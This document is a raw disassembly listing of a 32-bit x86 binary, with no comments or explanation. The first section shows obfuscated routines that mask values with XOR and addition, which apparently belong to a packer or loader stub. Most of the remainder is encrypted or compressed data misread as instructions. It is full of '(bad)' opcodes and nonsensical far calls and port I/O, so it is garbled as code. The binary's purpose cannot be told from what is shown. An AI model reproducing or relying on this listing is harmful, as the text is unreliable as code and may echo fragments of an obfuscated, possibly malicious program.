  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	daa    
  407496:	aas    
  407497:	int    0x2b
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	sar    BYTE PTR [esi+0x7e],0x20
  40749e:	jge    0x40751e
  4074a0:	jle    0x40744b
  4074a2:	jnp    0x407433
  4074a4:	jecxz  0x4074e9
  4074a6:	mov    bh,0x24
  4074a8:	cmp    BYTE PTR [esi+0x77],ch
  4074ab:	and    dh,bl
  4074ad:	mov    eax,ds:0x9d256f61
  4074b2:	and    al,BYTE PTR [eax-0x66]
  4074b5:	cmp    DWORD PTR [edx],eax
  4074b7:	cli    
  4074b8:	out    dx,eax
  4074b9:	jp     0x407481
  4074bb:	cmc    
  4074bc:	fwait
  4074bd:	pop    eax
  4074be:	push   ebp
  4074bf:	xchg   ecx,eax
  4074c0:	cmp    eax,0x894967f3
  4074c5:	loop   0x40752f
  4074c7:	mov    edi,0xabdac4d4
  4074cc:	and    al,BYTE PTR [eax-0x1baa91e]
  4074d2:	outs   dx,DWORD PTR ds:[esi]
  4074d3:	sbb    eax,0x30d54d09
  4074d8:	in     al,0x3f
  4074da:	sub    eax,0xbf840c95
  4074df:	imul   ebx,DWORD PTR [edi+0x30],0x15
  4074e3:	aas    
  4074e4:	(bad)  
  4074e5:	mov    ds:0xd5d9a7ae,eax
  4074ea:	sub    BYTE PTR [ebx],ch
  4074ec:	push   ds
  4074ed:	xlat   BYTE PTR ds:[ebx]
  4074ee:	in     al,0xe6
  4074f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074f1:	xlat   BYTE PTR ds:[ebx]
  4074f2:	mov    bh,0x2f
  4074f4:	es inc esi
  4074f6:	adc    BYTE PTR [esi-0x2df9656e],al
  4074fc:	(bad)  
  4074fd:	jmp    0x4074b9
  4074ff:	or     DWORD PTR [ebp+0x78dfa08d],ecx
  407505:	pusha  
  407506:	pop    esp
  407507:	cmp    ah,bh
  407509:	sbb    al,0x50
  40750b:	or     eax,0x901750b9
  407510:	(bad)  
  407511:	xchg   esi,eax
  407512:	cs (bad) 
  407514:	jae    0x407550
  407516:	jno    0x4074b5
  407518:	shr    DWORD PTR [ecx+0x686390c3],cl
  40751e:	scas   al,BYTE PTR es:[edi]
  40751f:	mov    al,ds:0xfbfe6c21
  407524:	push   es
  407525:	cmp    eax,edi
  407527:	rol    BYTE PTR [edi+0x413df63],1
  40752d:	out    0xc6,al
  40752f:	mov    ss,WORD PTR [ebp-0x5261f320]
  407535:	push   esp
  407536:	inc    ebp
  407537:	and    al,0xfe
  407539:	xchg   edi,eax
  40753a:	lods   al,BYTE PTR ds:[esi]
  40753b:	scas   al,BYTE PTR es:[edi]
  40753c:	loop   0x4075a7
  40753e:	dec    ebp
  40753f:	or     eax,0x839f9bf2
  407544:	repnz popa 
  407546:	daa    
  407547:	or     DWORD PTR [edx+0x4e],0xffffffc3
  40754b:	push   ebp
  40754c:	inc    ebp
  40754d:	cmc    
  40754e:	inc    ebx
  40754f:	cld    
  407550:	mov    DWORD PTR [esi-0x49c77754],ecx
  407556:	cmp    ah,bh
  407558:	imul   esp,ebx,0x9
  40755b:	outs   dx,DWORD PTR ds:[esi]
  40755c:	popf   
  40755d:	or     DWORD PTR [esi],ebp
  40755f:	or     bh,BYTE PTR [esi-0x79e83cab]
  407565:	into   
  407566:	inc    esp
  407567:	pop    ecx
  407568:	popa   
  407569:	mov    WORD PTR [esi+0x2d92584e],es
  40756f:	sbb    al,0xc
  407571:	imul   ebx,DWORD PTR [ecx+0x3ca572b3],0xffffffba
  407578:	frstor [edi-0x2b70fdf6]
  40757e:	jbe    0x407519
  407580:	fnstcw WORD PTR [edi+0x6c1b7021]
  407586:	mov    WORD PTR [ebp+0x18],cs
  407589:	cmc    
  40758a:	retf   0x2e3f
  40758d:	sbb    BYTE PTR [eax],dh
  40758f:	pop    ss
  407590:	mov    WORD PTR [edx],ds
  407592:	mov    ah,BYTE PTR [eax+0xd09e158]
  407598:	pop    esp
  407599:	stc    
  40759a:	dec    ebx
  40759b:	add    ecx,DWORD PTR [eax+0x1f2397ab]
  4075a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075a2:	arpl   WORD PTR [edi+ebp*1],dx
  4075a5:	sub    al,0x68
  4075a7:	test   DWORD PTR [edx+ecx*1-0x74fb5a63],esp
  4075ae:	lahf   
  4075af:	xchg   esp,eax
  4075b0:	ins    DWORD PTR es:[edi],dx
  4075b1:	push   esi
  4075b2:	mov    ah,0xed
  4075b4:	or     esp,edx
  4075b6:	and    eax,0x5ab7dbf7
  4075bb:	aas    
  4075bc:	dec    esi
  4075bd:	and    al,0x8a
  4075bf:	aad    0x17
  4075c1:	fistp  DWORD PTR [edx+esi*2]
  4075c4:	dec    BYTE PTR [edi]
  4075c6:	mov    esi,ebp
  4075c8:	pop    edi
  4075c9:	jno    0x40759c
  4075cb:	adc    eax,0xde3e715d
  4075d0:	nop
  4075d1:	dec    esi
  4075d2:	shr    DWORD PTR [edx],cl
  4075d4:	pop    ebx
  4075d5:	cld    
  4075d6:	pop    ds
  4075d7:	stos   DWORD PTR es:[edi],eax
  4075d8:	int    0x86
  4075da:	sti    
  4075db:	stos   BYTE PTR es:[edi],al
  4075dc:	and    ebx,DWORD PTR gs:[esi-0x1f]
  4075e0:	arpl   si,di
  4075e2:	xor    ebx,DWORD PTR [eax-0x8f85d07]
  4075e8:	push   es
  4075e9:	or     BYTE PTR [ecx-0x75],cl
  4075ec:	mov    dl,0x66
  4075ee:	sub    ebp,DWORD PTR [eax+0x78]
  4075f1:	nop
  4075f2:	dec    ebp
  4075f3:	bound  ebp,QWORD PTR [ebx-0xb2d6d39]
  4075f9:	bound  esi,QWORD PTR [ecx-0x10]
  4075fc:	loopne 0x4075f0
  4075fe:	mov    ecx,0xd627b9ad
  407603:	pop    DWORD PTR [edx+0x7b]
  407606:	fwait
  407607:	mov    ebp,0xc0038a49
  40760c:	inc    eax
  40760d:	cli    
  40760e:	into   
  40760f:	xor    DWORD PTR [ecx],eax
  407611:	stos   DWORD PTR es:[edi],eax
  407612:	sub    BYTE PTR [edx],ah
  407614:	loop   0x407614
  407616:	(bad)  
  407617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407618:	imul   ebp,DWORD PTR [ecx+edx*8-0x5033126],0x23
  407620:	out    dx,eax
  407621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407622:	icebp  
  407623:	scas   eax,DWORD PTR es:[edi]
  407624:	std    
  407625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407626:	cmp    ch,bh
  407628:	fwait
  407629:	call   0x5fa1:0xebc1c8cd
  407630:	out    0x1d,al
  407632:	and    eax,0x8df2885f
  407637:	fbstp  TBYTE PTR [edx-0x68]
  40763a:	mov    ebx,0x1a44fdc5
  40763f:	sbb    BYTE PTR [ecx-0x46a505e0],bl
  407645:	clc    
  407646:	xor    eax,0x88d73cfd
  40764b:	xlat   BYTE PTR ds:[ebx]
  40764c:	sbb    bl,BYTE PTR [esp+ebx*4-0x1a3681f3]
  407653:	sub    al,0xfd
  407655:	dec    esp
  407656:	sar    DWORD PTR [edi+0x77],1
  407659:	push   edi
  40765a:	cdq    
  40765b:	sub    DWORD PTR [eax-0x75847d4b],ebp
  407661:	sub    al,0xe6
  407663:	jecxz  0x40769e
  407665:	imul   edi,DWORD PTR [edx+0x61],0x7f
  407669:	test   esi,esi
  40766b:	leave  
  40766c:	pop    eax
  40766d:	(bad)  
  40766f:	inc    edi
  407670:	dec    ebp
  407671:	and    eax,0x5f0127f1
  407676:	rcl    DWORD PTR [ecx],1
  407678:	lea    eax,[edi-0x33]
  40767b:	push   eax
  40767c:	mov    ds:0xf383ad74,eax
  407681:	imul   edi,DWORD PTR [esi+esi*2],0xffffffe9
  407685:	stos   BYTE PTR es:[edi],al
  407686:	mov    esp,0x585cd2d5
  40768b:	cmp    esi,ebx
  40768d:	xchg   ebp,eax
  40768e:	mov    bl,0x56
  407690:	adc    al,0x92
  407692:	inc    edx
  407693:	cmp    al,0x74
  407695:	cmc    
  407696:	pop    eax
  407697:	pushf  
  407698:	sbb    DWORD PTR [edx],edi
  40769a:	xor    DWORD PTR [edi+0x52d8890b],edi
  4076a0:	enter  0xc7d,0xb3
  4076a4:	mov    ds,WORD PTR [ebp+ecx*1+0x1d41a1bf]
  4076ab:	in     eax,dx
  4076ac:	scas   eax,DWORD PTR es:[edi]
  4076ad:	inc    ebx
  4076ae:	fstp   QWORD PTR [esi]
  4076b0:	xchg   esp,eax
  4076b1:	push   edi
  4076b2:	adc    DWORD PTR [esi],eax
  4076b4:	add    dh,BYTE PTR ds:0xf710f40a
  4076ba:	aas    
  4076bb:	dec    ebp
  4076bc:	xor    edi,edi
  4076be:	mov    eax,0x3b7904a8
  4076c3:	lods   al,BYTE PTR ds:[esi]
  4076c4:	mov    ch,0x3
  4076c6:	ret    0x9355
  4076c9:	pushf  
  4076ca:	mov    edi,0x936c96d5
  4076cf:	fdivrp st(0),st
  4076d1:	dec    esp
  4076d2:	shl    BYTE PTR [ebx-0x7ec8eee1],cl
  4076d8:	or     al,0x76
  4076da:	pop    esi
  4076db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076dc:	adc    DWORD PTR [edx+0x70c02a9f],edx
  4076e2:	mov    WORD PTR [esi+0x7f05315a],es
  4076e8:	pop    ebx
  4076e9:	add    al,0x6f
  4076eb:	mov    eax,ds:0xf5e136cc
  4076f0:	and    bh,BYTE PTR [ebx+0x8]
  4076f3:	lods   eax,DWORD PTR ds:[esi]
  4076f4:	daa    
  4076f5:	mov    ecx,0x67564be5
  4076fa:	jnp    0x40771e
  4076fc:	loop   0x407702
  4076fe:	bound  esp,QWORD PTR [ebx-0x7c]
  407701:	stos   BYTE PTR es:[edi],al
  407702:	xchg   esi,esp
  407704:	and    BYTE PTR cs:[ecx],dl
  407707:	push   ebx
  407708:	(bad)  
  407709:	pop    ds
  40770a:	loopne 0x407694
  40770c:	call   0x92862d53
  407711:	mov    ebp,0x8dc68771
  407716:	rcr    DWORD PTR [eax-0x1],0x75
  40771a:	leave  
  40771b:	fistp  QWORD PTR [edi+ebp*8+0x51807b4a]
  407722:	jno    0x407737
  407724:	rcr    BYTE PTR [edi+0x6b29ff36],0xd2
  40772b:	mov    bh,0xa3
  40772d:	mov    ah,0x2
  40772f:	lods   al,BYTE PTR ds:[esi]
  407730:	ret    0x158
  407733:	add    al,0xb0
  407735:	iret   
  407736:	mov    eax,ds:0x614595ae
  40773b:	out    dx,eax
  40773c:	inc    esp
  40773d:	cmp    DWORD PTR [ebp+ebx*8-0x39],esi
  407741:	jp     0x407703
  407743:	dec    esi
  407744:	pop    eax
  407745:	ins    BYTE PTR es:[edi],dx
  407746:	inc    esi
  407747:	ss dec esi
  407749:	and    eax,0x137c313f
  40774e:	scas   al,BYTE PTR es:[edi]
  40774f:	rcr    BYTE PTR gs:[esi],cl
  407752:	pop    esi
  407753:	jle    0x407768
  407755:	sahf   
  407756:	rol    DWORD PTR es:[ecx+eiz*1-0x5eff852],1
  40775e:	sar    DWORD PTR [ebp-0x270cade1],0x54
  407765:	ins    DWORD PTR es:[edi],dx
  407766:	dec    eax
  407767:	mov    WORD PTR [edi],gs
  407769:	cmp    al,0x77
  40776b:	mov    DWORD PTR [edx-0x56259536],esp
  407771:	sub    DWORD PTR [eax-0x7f7565ef],esi
  407777:	clc    
  407778:	jge    0x407783
  40777a:	cwde   
  40777b:	fadd   st(6),st
  40777d:	retf   
  40777e:	mov    dl,0x54
  407780:	jno    0x407713
  407782:	jle    0x4077db
  407784:	mov    edi,0x64bed347
  407789:	jno    0x407714
  40778b:	jo     0x40771b
  40778d:	(bad)  
  40778e:	push   edx
  40778f:	fcom   QWORD PTR [edx]
  407791:	ret    
  407792:	push   ds
  407793:	icebp  
  407794:	xor    al,0x81
  407796:	push   ebx
  407797:	loop   0x40774d
  407799:	fimul  DWORD PTR [ebp-0x67ad833c]
  40779f:	(bad)  
  4077a1:	leave  
  4077a2:	shl    BYTE PTR [esi],0xaa
  4077a5:	pop    ss
  4077a6:	push   esp
  4077a7:	add    al,BYTE PTR [edx]
  4077a9:	xchg   edx,eax
  4077aa:	sbb    eax,0xfceb27c9
  4077af:	inc    BYTE PTR [esi]
  4077b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b2:	loopne 0x407744
  4077b4:	mov    ch,0x70
  4077b6:	fild   DWORD PTR [ecx-0x3e]
  4077b9:	(bad)  
  4077ba:	push   cs
  4077bb:	mov    ebx,0x2a83016f
  4077c0:	or     eax,ebx
  4077c2:	or     ecx,DWORD PTR [ebp+0x23]
  4077c5:	sbb    ecx,DWORD PTR [esi-0x20b07aa0]
  4077cb:	nop
  4077cc:	adc    eax,0x4d8b5baf
  4077d1:	cld    
  4077d2:	mov    DWORD PTR ds:0x4337a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	imul   ebx,DWORD PTR [ebx+0x29],0x7ecf56cb
  4077fb:	jle    0x40781d
  4077fd:	jge    0x40787d
  4077ff:	jle    0x407804
  407801:	ja     0x407878
  407803:	(bad)  
  407804:	mov    al,ds:0x7efc5406
  407809:	(bad)  
  40780a:	loop   0x407862
  40780c:	sbb    esp,DWORD PTR [ecx]
  40780e:	sub    al,0xdc
  407810:	jbe    0x4077c0
  407812:	lea    edi,[edx-0x25]
  407815:	test   esi,ecx
  407817:	(bad)  
  407818:	and    al,0xc9
  40781a:	fbstp  TBYTE PTR [ebx]
  40781c:	cdq    
  40781d:	stos   BYTE PTR es:[edi],al
  40781e:	stos   DWORD PTR es:[edi],eax
  40781f:	and    DWORD PTR [ecx],esp
  407821:	or     dh,0x70
  407824:	cmp    bl,BYTE PTR [esi]
  407826:	jae    0x40789f
  407828:	shl    BYTE PTR [esi-0x70],0x79
  40782c:	imul   eax,DWORD PTR [ebp-0x5],0xffffff83
  407830:	push   esp
  407831:	mov    ecx,?
  407833:	retf   
  407834:	push   edi
  407835:	xor    DWORD PTR [ebx-0x27],ebx
  407838:	mov    al,0x3d
  40783a:	jb     0x40785b
  40783c:	push   fs
  40783e:	add    esi,ecx
  407840:	ss pop eax
  407842:	sbb    cl,bh
  407844:	xchg   edx,eax
  407845:	xor    esi,DWORD PTR [ecx-0x16]
  407848:	pop    ecx
  407849:	aaa    
  40784a:	push   cs
  40784b:	cmp    al,0xbb
  40784d:	dec    esi
  40784e:	in     eax,dx
  40784f:	xchg   esi,eax
  407850:	xchg   BYTE PTR ds:0xd1fc1ab1,ch
  407857:	leave  
  407858:	std    
  407859:	scas   al,BYTE PTR es:[edi]
  40785a:	inc    ebp
  40785b:	pop    es
  40785c:	into   
  40785d:	dec    edi
  40785e:	inc    eax
  40785f:	push   edi
  407860:	dec    edx
  407861:	clc    
  407862:	mov    ah,0xa3
  407864:	adc    BYTE PTR [edi-0x7e0530fe],cl
  40786a:	xor    DWORD PTR [eax+0x187e74fb],ebx
  407870:	push   eax
  407871:	xchg   DWORD PTR [esi+ebp*4+0x3ec090e4],esi
  407878:	sub    BYTE PTR [ecx],ch
  40787a:	dec    ebx
  40787b:	(bad)  
  40787c:	fisttp DWORD PTR [ecx-0xf]
  40787f:	jecxz  0x4078e4
  407881:	scas   al,BYTE PTR es:[edi]
  407882:	dec    esi
  407883:	pop    edi
  407884:	popf   
  407885:	jp     0x4078ea
  407887:	sub    al,0xe5
  407889:	pop    edi
  40788a:	mov    al,0xbb
  40788c:	push   edi
  40788d:	cwde   
  40788e:	mov    cl,0x25
  407890:	mov    ah,0xca
  407892:	push   esp
  407893:	repnz add ah,BYTE PTR [edi+0x4f92971c]
  40789a:	adc    DWORD PTR [esi-0x2],0x3f
  40789e:	push   edx
  40789f:	imul   ebx,DWORD PTR [edx+eiz*8-0x6b155849],0x14
  4078a7:	pop    eax
  4078a8:	shl    DWORD PTR [ebp-0x3004782e],1
  4078ae:	js     0x4078c2
  4078b0:	inc    esp
  4078b1:	ins    DWORD PTR es:[edi],dx
  4078b2:	xchg   ebp,eax
  4078b3:	lods   al,BYTE PTR ds:[esi]
  4078b4:	(bad)  
  4078b5:	stos   BYTE PTR es:[edi],al
  4078b6:	retf   0xa944
  4078b9:	xor    ch,BYTE PTR [ebp+0x1e877263]
  4078bf:	sbb    eax,0x34c462c3
  4078c4:	pop    ds
  4078c5:	xor    dh,BYTE PTR [ebp+0x33f9af17]
  4078cb:	leave  
  4078cc:	lea    esp,[ebx+0x3c]
  4078cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d0:	ds dec edi
  4078d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d3:	pop    eax
  4078d4:	cmp    eax,0x13a2825b
  4078d9:	pop    esp
  4078da:	jne    0x4078e4
  4078dc:	std    
  4078dd:	push   ds
  4078de:	ja     0x407931
  4078e0:	push   ebx
  4078e1:	retf   0xf43b
  4078e4:	fsubp  st(6),st
  4078e6:	add    al,0x59
  4078e8:	cmp    DWORD PTR [ecx-0x4d76b89a],ebx
  4078ee:	in     eax,0x95
  4078f0:	(bad)  
  4078f1:	jecxz  0x407902
  4078f3:	ds arpl ax,dx
  4078f6:	cs stos DWORD PTR es:[edi],eax
  4078f8:	in     al,dx
  4078f9:	fucom  st(1)
  4078fb:	cmp    bh,BYTE PTR [ecx+0x4a]
  4078fe:	out    dx,eax
  4078ff:	fcmovne st,st(4)
  407901:	jmp    0x407905
  407903:	cmp    bh,BYTE PTR [ebx-0x5c074b3]
  407909:	add    dh,0x4f
  40790c:	pop    ss
  40790d:	popf   
  40790e:	loop   0x4078f8
  407910:	and    al,0x99
  407912:	push   ds
  407913:	inc    esi
  407914:	jecxz  0x407910
  407916:	pushf  
  407917:	stos   DWORD PTR es:[edi],eax
  407918:	add    eax,0xa5762f12
  40791d:	ds push ecx
  40791f:	xchg   esp,eax
  407920:	inc    BYTE PTR [ebp-0x4e]
  407923:	lds    edi,FWORD PTR [ebp+0x75f1e7ee]
  407929:	mov    ebx,0x3c96bbe4
  40792e:	std    
  40792f:	adc    BYTE PTR [ebx-0x6a769641],dl
  407935:	mov    ch,0x66
  407937:	xchg   esi,esp
  407939:	add    eax,0xac591ce0
  40793e:	imul   eax,DWORD PTR [esi+0x218acfe9],0x21
  407945:	(bad)  
  407946:	jg     0x407950
  407948:	xchg   BYTE PTR [edx-0x7a608143],dl
  40794e:	mov    ecx,0x12f95508
  407953:	dec    eax
  407954:	call   0xf8f5:0x2fbac737
  40795b:	sbb    BYTE PTR [ebx-0x6a],0xee
  40795f:	cmp    bh,BYTE PTR ds:0xd94d401
  407965:	xor    BYTE PTR [eax],bl
  407967:	nop
  407968:	nop
  407969:	dec    esp
  40796a:	sti    
  40796b:	jmp    0xc51fc165
  407970:	xchg   ecx,eax
  407971:	inc    eax
  407972:	loop   0x4079c5
  407974:	xor    BYTE PTR [ecx],ah
  407976:	out    dx,eax
  407977:	cs inc ebp
  407979:	out    dx,al
  40797a:	(bad)  
  40797b:	sbb    ebx,DWORD PTR [edx]
  40797d:	mov    al,0x2b
  40797f:	pop    esp
  407980:	test   BYTE PTR [eax+0x54e3af90],ah
  407986:	sbb    DWORD PTR [ebp-0x55],esp
  407989:	outs   dx,DWORD PTR ds:[esi]
  40798a:	xchg   esp,eax
  40798b:	leave  
  40798c:	cmp    BYTE PTR [ecx-0x63],bh
  40798f:	add    BYTE PTR [ecx+esi*2+0x4dd0ce6f],0x40
  407997:	fisttp DWORD PTR [ebx]
  407999:	outs   dx,DWORD PTR ds:[esi]
  40799a:	and    dl,BYTE PTR [eax-0x58c597bb]
  4079a0:	test   DWORD PTR [esi],0x3293bad6
  4079a6:	loopne 0x407937
  4079a8:	xchg   ebp,eax
  4079a9:	cwde   
  4079aa:	mov    bh,0xf2
  4079ac:	repnz test ecx,0xc5457874
  4079b3:	test   BYTE PTR [ebx+0x773b86ae],dl
  4079b9:	mov    ecx,fs
  4079bb:	jl     0x407a0e
  4079bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079be:	add    al,0xfe
  4079c0:	mov    esp,0x497d8e9a
  4079c5:	ins    BYTE PTR es:[edi],dx
  4079c6:	sub    dl,al
  4079c8:	mov    cl,0x68
  4079ca:	mov    cl,0xf8
  4079cc:	mov    edx,0x2c3f72c0
  4079d1:	jmp    0x5cb734ef
  4079d6:	adc    ebx,DWORD PTR [ecx]
  4079d8:	xor    esp,edi
  4079da:	mov    al,ds:0x3dc57e5
  4079df:	rol    DWORD PTR [edx+edx*2],1
  4079e2:	add    eax,0x5c4b2505
  4079e7:	or     al,0xb9
  4079e9:	pop    es
  4079ea:	dec    edx
  4079eb:	scas   eax,DWORD PTR es:[edi]
  4079ec:	jecxz  0x407a09
  4079ee:	stos   DWORD PTR es:[edi],eax
  4079ef:	test   al,0x93
  4079f1:	jmp    0xfce47b9a
  4079f6:	jecxz  0x4079a0
  4079f8:	and    BYTE PTR [edx],0x3c
  4079fb:	pop    edi
  4079fc:	fcom   QWORD PTR [ebx+0x76]
  4079ff:	pop    ebp
  407a00:	pop    edx
  407a01:	adc    al,0xa2
  407a03:	xchg   DWORD PTR [esp+edi*2-0x296fb34c],ebx
  407a0a:	jns    0x407a2a
  407a0c:	add    eax,0x5648c6cc
  407a11:	or     al,0xe9
  407a13:	push   ebp
  407a14:	out    0xf1,al
  407a16:	mov    ecx,0xc2192afc
